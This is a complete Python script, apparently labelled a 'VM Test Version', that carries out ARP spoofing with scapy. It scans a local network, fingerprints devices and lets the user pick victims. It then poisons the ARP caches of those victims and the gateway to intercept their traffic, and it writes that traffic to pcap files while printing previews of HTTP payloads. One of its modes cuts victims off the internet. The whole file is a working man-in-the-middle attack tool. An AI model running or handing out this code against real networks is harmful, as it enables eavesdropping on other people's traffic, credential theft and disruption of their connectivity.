from scapy.all import ARP, sendp, get_if_list, get_if_hwaddr, Ether, srp, IP, ICMP, sniff, Raw, TCP, wrpcap
import time
import sys
import os
import ctypes
import logging
from datetime import datetime
import threading
import re

class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

target_ips = []
gateway_ip = ""
interface = ""
packet_count = 0
start_time = 0
restore_flag = False
traffic_stats = {"upload": 0, "download": 0}
log_file = ""
capture_file = ""
capture_count = 0
device_types = {}

def init_log():
    global log_file
    log_dir = "arp_spoof_logs"
    os.makedirs(log_dir, exist_ok=True)
    log_name = f"spoof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    log_file = os.path.join(log_dir, log_name)
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    logging.info("ARP Spoofer Started (With Traffic Sniffing + Auto Capture + Device Identification)")

def identify_device(ip, mac):
    if ip in device_types:
        return device_types[ip]
    phone_vendors = ["00:1A:7D", "00:24:EE", "38:E7:D8", "5C:CA:D3", "78:2B:CB", "8C:85:90", "9C:B6:D0", "A8:9C:ED", "D0:9C:23"]
    pc_vendors = ["00:0C:29", "00:1E:4F", "00:23:5A", "00:50:56", "18:66:DA", "28:6E:D4", "3C:97:0E", "52:54:00", "80:EE:73"]
    router_vendors = ["00:00:0C", "00:1E:58", "00:22:75", "00:26:B6", "00:37:6D", "00:90:4C", "10:FE:ED", "40:8D:5C", "70:4C:A5"]
    device_type = "Unknown Device"
    mac_prefix = mac[:8].upper()
    if any(vendor in mac_prefix for vendor in phone_vendors):
        device_type = "Mobile Phone"
    elif any(vendor in mac_prefix for vendor in pc_vendors):
        device_type = "Computer"
    elif any(vendor in mac_prefix for vendor in router_vendors):
        device_type = "Router"
    else:
        try:
            pkt = IP(dst=ip)/ICMP()
            resp = sr1(pkt, timeout=2, verbose=0)
            if resp:
                ttl = resp.ttl
                if ttl == 64:
                    device_type = "Mobile/Tablet"
                elif ttl == 128:
                    device_type = "Computer (Windows)"
                elif ttl == 255:
                    device_type = "Router/Network Device"
        except:
            pass
    device_types[ip] = device_type
    logging.info(f"Device Identification: {ip} | {mac} → {device_type}")
    return device_type

def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=0)[0]
        mac = answered_list[0][1].hwsrc
        logging.info(f"Get MAC Address of IP {ip}: {mac}")
        return mac
    except Exception as e:
        logging.error(f"Failed to Get MAC Address of IP {ip}: {str(e)}")
        return None

def scan_lan(interface, gateway_ip):
    print(f"\n{bcolors.BOLD}[*] Scanning LAN Online Devices (With Device Identification)...{bcolors.ENDC}")
    logging.info("Start LAN Scanning + Device Identification")
    lan_ip = gateway_ip.rsplit('.', 1)[0] + ".1/24"
    arp_request = ARP(pdst=lan_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=10, iface=interface, verbose=0)[0]
    online_devices = []
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        if ip != gateway_ip:
            device_type = identify_device(ip, mac)
            online_devices.append({"ip": ip, "mac": mac, "type": device_type})
            print(f"{bcolors.OKGREEN}[+] Online Device: {ip} | {mac} | {device_type}{bcolors.ENDC}")
    logging.info(f"LAN Scanning Completed, Found {len(online_devices)} Online Devices")
    return online_devices

def select_targets(devices):
    print(f"\n{bcolors.BOLD}[*] Select Targets to Spoof (Multiple supported, split by commas, e.g. 1,3,5){bcolors.ENDC}")
    for i, dev in enumerate(devices):
        print(f"{i+1}. {dev['ip']} | {dev['mac']} | {dev['type']}")
    while True:
        choice = input(f"{bcolors.BOLD}[*] Enter Selection (Press Enter to select all): {bcolors.ENDC}")
        if not choice:
            return [dev['ip'] for dev in devices]
        try:
            indices = [int(x.strip())-1 for x in choice.split(',')]
            targets = [devices[i]['ip'] for i in indices if 0 <= i < len(devices)]
            if targets:
                logging.info(f"Selected Spoof Targets: {','.join(targets)}")
                return targets
            else:
                print(f"{bcolors.FAIL}[-] Invalid Selection, Please Re-enter{bcolors.ENDC}")
        except:
            print(f"{bcolors.FAIL}[-] Invalid Input Format, Please Enter Numbers (e.g. 1,3){bcolors.ENDC}")

def packet_sniffer(packet):
    global capture_count, traffic_stats
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        pkt_len = len(packet)
        if src_ip in target_ips or dst_ip in target_ips:
            capture_count += 1
            if src_ip in target_ips:
                traffic_stats["upload"] += pkt_len
            if dst_ip in target_ips:
                traffic_stats["download"] += pkt_len
            if capture_file:
                wrpcap(capture_file, packet, append=True)
                if packet.haslayer(TCP) and (packet[TCP].dport == 80 or packet[TCP].sport == 80):
                    if packet.haslayer(Raw):
                        http_data = packet[Raw].load[:200]
                        logging.info(f"HTTP Traffic Captured: {src_ip} → {dst_ip} | {http_data[:50]}...")
                        print(f"\n{bcolors.WARNING}[Capture] HTTP Traffic: {src_ip} → {dst_ip}{bcolors.ENDC}")
                        print(f"Data Preview: {http_data.decode('utf-8', errors='ignore')}")

def start_sniffing():
    global capture_file
    capture_dir = "arp_captures"
    os.makedirs(capture_dir, exist_ok=True)
    capture_name = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
    capture_file = os.path.join(capture_dir, capture_name)
    print(f"\n{bcolors.OKGREEN}[+] Traffic Sniffing Started, Capture File: {capture_file}{bcolors.ENDC}")
    logging.info(f"Start Traffic Sniffing, Save to: {capture_file}")
    sniff_filter = " or ".join([f"host {ip}" for ip in target_ips])
    sniff(iface=interface, filter=sniff_filter, prn=packet_sniffer, store=0, stop_filter=lambda x: restore_flag)

def spoof(target_ip, spoof_ip, interface):
    global packet_count
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"{bcolors.FAIL}[-] Failed to Get MAC Address of {target_ip}, Skip This Target{bcolors.ENDC}")
        return
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(arp_response, iface=interface, verbose=0)
    packet_count += 1
    traffic_stats["upload"] += len(arp_response)
    logging.info(f"Send Spoof Packet to {target_ip} (Spoof as {spoof_ip})")

def restore(destination_ip, source_ip, interface):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        arp_response = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        sendp(arp_response, iface=interface, verbose=0, count=3)
        logging.info(f"Restore ARP Cache of {destination_ip} (Source IP: {source_ip})")
        print(f"{bcolors.OKGREEN}[+] Restored ARP Cache of {destination_ip}{bcolors.ENDC}")

def enable_ip_forward():
    if sys.platform.startswith("linux"):
        try:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            logging.info("Linux IP Forwarding Enabled")
            print(f"{bcolors.OKGREEN}[+] Linux IP Forwarding Enabled, Victims Can Access Internet (Easy to Capture){bcolors.ENDC}")
        except Exception as e:
            logging.error(f"Failed to Enable Linux IP Forwarding: {str(e)}")
            print(f"{bcolors.WARNING}[-] Failed to Enable IP Forwarding, Please Execute Manually: sudo echo 1 > /proc/sys/net/ipv4/ip_forward{bcolors.ENDC}")
    elif sys.platform.startswith("win32"):
        logging.info("Windows Users Need to Enable IP Forwarding Manually")
        print(f"\n{bcolors.WARNING}[!] Windows IP Forwarding Tutorial: {bcolors.ENDC}")
        print("1. Press Win+R, Enter services.msc")
        print("2. Find 'Routing and Remote Access', Right Click to Start")
        print("3. Victims Can Access Internet After Starting (Need Admin Privileges)")

def select_interface():
    print(f"\n{bcolors.BOLD}[*] Available Network Interfaces: {bcolors.ENDC}")
    ifaces = get_if_list()
    valid_ifaces = []
    for i, iface in enumerate(ifaces):
        try:
            mac = get_if_hwaddr(iface)
            valid_ifaces.append((i+1, iface, mac))
            print(f"  {i+1}. Interface Name: {iface} | MAC: {mac}")
        except:
            continue
    while True:
        choice = input(f"\n{bcolors.BOLD}[*] Enter Interface Number: {bcolors.ENDC}")
        try:
            idx = int(choice)
            for num, iface, mac in valid_ifaces:
                if num == idx:
                    logging.info(f"Selected Interface: {iface} (MAC: {mac})")
                    return iface
            print(f"{bcolors.FAIL}[-] Invalid Number, Please Re-select{bcolors.ENDC}")
        except:
            print(f"{bcolors.FAIL}[-] Input Error, Please Enter a Number{bcolors.ENDC}")

def traffic_monitor():
    while not restore_flag:
        upload_mb = traffic_stats["upload"] / 1024 / 1024
        download_mb = traffic_stats["download"] / 1024 / 1024
        print(f"\r{bcolors.BOLD}[Traffic Monitor] Upload: {upload_mb:.2f}MB | Download: {download_mb:.2f}MB | Capture Count: {capture_count}{bcolors.ENDC}", end="")
        sys.stdout.flush()
        time.sleep(1)

def main():
    global target_ips, gateway_ip, interface, start_time, restore_flag
    init_log()
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}=====================================")
    print("        Ultimate ARP Spoofer (VM Test Version)")
    print("  Features: LAN Scan + Device ID + Batch Spoof + Traffic Sniff + Auto Capture")
    print("====================================={bcolors.ENDC}")
    gateway_ip = input(f"\n{bcolors.BOLD}[*] Enter Gateway IP (Router): {bcolors.ENDC}")
    interface = select_interface()
    online_devices = scan_lan(interface, gateway_ip)
    if not online_devices:
        print(f"{bcolors.FAIL}[-] No Online Devices Found, Exit Program{bcolors.ENDC}")
        logging.error("No Online Devices Found, Exit Program")
        sys.exit()
    target_ips = select_targets(online_devices)
    print(f"\n{bcolors.BOLD}[*] Spoof Mode: {bcolors.ENDC}")
    print("1. Bidirectional Spoof (Victim ↔ Gateway, Recommended, Easy to Capture)")
    print("2. Unidirectional Spoof (Victim → Gateway, Victim Lose Internet)")
    mode = input(f"{bcolors.BOLD}[*] Select Mode (1/2, Default 1): {bcolors.ENDC}") or "1"
    print(f"\n{bcolors.WARNING}[!] VM Test Tip: Current Spoof Targets: {','.join(target_ips)}{bcolors.ENDC}")
    print(f"Gateway IP: {gateway_ip} | Interface: {interface} | Mode: {'Bidirectional' if mode=='1' else 'Unidirectional'}")
    print(f"{bcolors.WARNING}[!] Capture File Saved as PCAP Format, Can Be Opened with Wireshark{bcolors.ENDC}")
    confirm = input(f"{bcolors.BOLD}[*] Confirm to Start? (y/n): {bcolors.ENDC}").lower()
    if confirm != "y":
        print(f"{bcolors.OKGREEN}[+] Operation Cancelled{bcolors.ENDC}")
        logging.info("User Cancelled Operation")
        sys.exit()
    enable_ip_forward()
    monitor_thread = threading.Thread(target=traffic_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    sniff_thread = threading.Thread(target=start_sniffing)
    sniff_thread.daemon = True
    sniff_thread.start()
    start_time = time.time()
    print(f"\n{bcolors.OKGREEN}[+] Spoof + Sniff Started! Press Ctrl+C to Stop and Restore{bcolors.ENDC}")
    logging.info(f"Start Spoofing, Targets: {','.join(target_ips)}, Mode: {'Bidirectional' if mode=='1' else 'Unidirectional'}")
    try:
        while True:
            for target_ip in target_ips:
                if mode == "1":
                    spoof(target_ip, gateway_ip, interface)
                    spoof(gateway_ip, target_ip, interface)
                else:
                    spoof(target_ip, gateway_ip, interface)
            elapsed = time.time() - start_time
            print(f"\r{bcolors.BOLD}[*] Sent {packet_count} Packets | Duration: {elapsed:.1f} Seconds{bcolors.ENDC}", end="")
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        restore_flag = True
        print(f"\n\n{bcolors.WARNING}[-] Stop Signal Received, Restoring ARP Cache...{bcolors.ENDC}")
        logging.info("User Stopped Spoofing, Start Restoring ARP Cache")
    finally:
        if restore_flag:
            for target_ip in target_ips:
                restore(target_ip, gateway_ip, interface)
                restore(gateway_ip, target_ip, interface)
            if sys.platform.startswith("linux"):
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                logging.info("Linux IP Forwarding Disabled")
                print(f"{bcolors.WARNING}[-] Linux IP Forwarding Disabled{bcolors.ENDC}")
        elapsed = time.time() - start_time
        upload_mb = traffic_stats["upload"] / 1024 / 1024
        download_mb = traffic_stats["download"] / 1024 / 1024
        print(f"\n\n{bcolors.BOLD}[*] Test Statistics Report: {bcolors.ENDC}")
        print(f"Target Count: {len(target_ips)}")
        print(f"Device Type Distribution: {[device_types[ip] for ip in target_ips]}")
        print(f"Spoof Packets Sent: {packet_count}")
        print(f"Duration: {elapsed:.1f} Seconds")
        print(f"Upload Traffic: {upload_mb:.2f} MB")
        print(f"Download Traffic: {download_mb:.2f} MB")
        print(f"Captured Packets: {capture_count}")
        print(f"Log File: {log_file}")
        print(f"Capture File: {capture_file} (Can Be Opened with Wireshark)")
        print(f"{bcolors.OKGREEN}[+] Test Completed, All Victims' Network Restored{bcolors.ENDC}")
        logging.info(f"Test Completed, Duration: {elapsed:.1f}s, Packets Sent: {packet_count}, Captured Packets: {capture_count}")

if __name__ == "__main__":
    try:
        is_admin = False
        if sys.platform.startswith("linux"):
            is_admin = os.geteuid() == 0
        elif sys.platform.startswith("win32"):
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            print(f"{bcolors.FAIL}[-] Please Run as Admin/root!{bcolors.ENDC}")
            sys.exit()
    except:
        print(f"{bcolors.FAIL}[-] Privilege Check Failed, Please Run as Admin/root!{bcolors.ENDC}")
        sys.exit()
    main()